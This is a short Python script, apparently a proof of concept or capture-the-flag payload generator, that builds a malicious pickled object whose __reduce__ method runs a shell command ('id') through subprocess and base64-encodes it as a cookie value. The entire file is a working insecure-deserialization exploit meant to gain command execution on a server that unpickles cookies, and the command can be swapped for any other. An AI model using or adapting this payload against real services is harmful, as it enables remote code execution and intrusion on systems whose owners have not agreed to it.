#!/usr/bin/python
import pickle
import base64
import os

command = 'id'


class Exp:
    def __reduce__(self):
        return (__import__('subprocess').getoutput, (command,))


cookie = base64.b64encode(pickle.dumps({"age": 1, "name": Exp()})).decode()

print(cookie)
